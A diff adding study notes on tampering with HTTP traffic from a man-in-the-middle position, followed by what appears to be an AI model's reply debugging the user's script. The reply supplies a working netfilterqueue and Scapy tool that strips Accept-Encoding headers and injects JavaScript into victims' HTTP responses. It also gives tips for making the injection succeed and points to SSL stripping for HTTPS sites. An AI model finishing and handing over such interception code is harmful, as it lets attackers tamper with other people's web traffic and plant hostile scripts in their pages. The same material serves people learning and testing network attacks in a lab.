@@ -1,0 +1,119 @@
+Modifying Data in HTTP Layer 
+
+    Victim <-------------> Hacker VM <------------> Acess Point (Gateway)
+              (Req/Res)    (Req/Res)    (Req/Res)
+    
+    - Edit requests/responses 
+    - Replace download requests
+    - Inject code (html/Javascript)
+
+    Your code looks mostly correct, but it seems you might be facing an issue with the
+    script injection (i.e., the JavaScript alert not executing on page load).
+    Let's go through some important checks and possible improvements:
+
+    Potential Issues & Fixes
+
+    Recalculate Checksums and Lengths Properly:
+        When you modify the payload, you are correctly removing the len and chksum fields
+        from both the IP and TCP layers. However, after modifying the payload,
+        you need to ensure the checksum and length are recalculated properly.
+        You’re doing this, but let’s double-check if the packet's entire structure
+        is getting correctly reconstructed.
+
+    Correct Handling of Packet Layers:
+        When you call set_load, you should ensure the packet's new load is being correctly
+        integrated with the rest of the packet's layers (i.e., IP, TCP, Raw).
+        One possible issue is how Scapy handles the layers after modification.
+        Ensure that the modified scapy_packet correctly rebuilds its internal structure
+        after you change the payload.
+
+Suggested Improvements
+
+Let’s rewrite and slightly adjust the code to ensure everything works smoothly:
+
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    
+    # Make sure we're working with a packet that contains data
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet.haslayer(scapy.TCP):
+            
+            # Handle HTTP request (incoming to port 80)
+            if scapy_packet[scapy.TCP].dport == 80:  # HTTP request
+                print("[+] Request -------------------------------------------")
+                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
+                new_packet = set_load(scapy_packet, modified_load)
+                packet.set_payload(bytes(new_packet))  # Set modified packet back to netfilterqueue
+
+            # Handle HTTP response (outgoing from port 80)
+            elif scapy_packet[scapy.TCP].sport == 80:  # HTTP response
+                print("[+] Response ---------------------------------------------------")
+                
+                # Check if "</body>" exists in the payload to insert JavaScript
+                if b"</body>" in scapy_packet[scapy.Raw].load:
+                    print("I found it!------------------------------------------------")
+                    print(scapy_packet.show())
+                    
+                    # Insert the JavaScript before the closing </body> tag
+                    modified_load = re.sub(b"</body>", b"<script>alert('Test')</script></body>", scapy_packet[scapy.Raw].load)
+                    
+                    # Set the modified load and recalculate checksums/lengths
+                    new_packet = set_load(scapy_packet, modified_load)
+                    print("Inserted script!------------------------------------------------")
+                    print(new_packet.show())
+                    
+                    # Set the modified packet back to netfilterqueue
+                    packet.set_payload(bytes(new_packet))
+
+    packet.accept()
+
+# Create and bind the queue
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+Changes and Improvements:
+
+    Rebuilding the Packet: After you modify the Raw layer with your JavaScript, you call set_load() to ensure that the IP and TCP checksums are recalculated.
+    Modified Packet Handling: The modified packet (after inserting JavaScript into the HTML response) is now correctly reassigned to the netfilterqueue's payload with packet.set_payload(bytes(new_packet)).
+    Logging: I’ve kept the print statements so you can trace what’s happening at each stage.
+
+Additional Debugging:
+
+If the JavaScript alert still does not trigger after these changes, consider these steps:
+
+    Verify Content-Type:
+        Ensure the server is actually sending a response with a Content-Type: text/html header. If the content type is incorrect, the browser might not interpret the HTML as intended.
+
+    Clear Browser Cache:
+        Browsers often cache responses, and you might be seeing an old version of the page without the script injected. Make sure to clear the cache or do a hard refresh (Ctrl + F5).
+
+    Test with Plain JavaScript:
+        Instead of <script>alert('Test')</script>, try inserting a simpler script like:
+
+    <script>console.log("Test script inserted!")</script>
+
+    Check the browser's developer tools (F12) to see if the log appears in the console.
+
+Check for HTTPS Traffic:
+
+    If the website is served over HTTPS, your code will not work unless you're able to intercept and modify HTTPS traffic (e.g., using a proxy tool like mitmproxy or SSL stripping).
+
+Make Sure the Payload Is Correct:
+
+    Print the raw payload of the HTTP response just before modifying it to confirm the response structure:
+
+        print(scapy_packet[scapy.Raw].load)
+
+By following these steps and applying the suggested fixes, you should be able to successfully inject the JavaScript alert into the HTTP response. Let me know if you encounter any other issues!
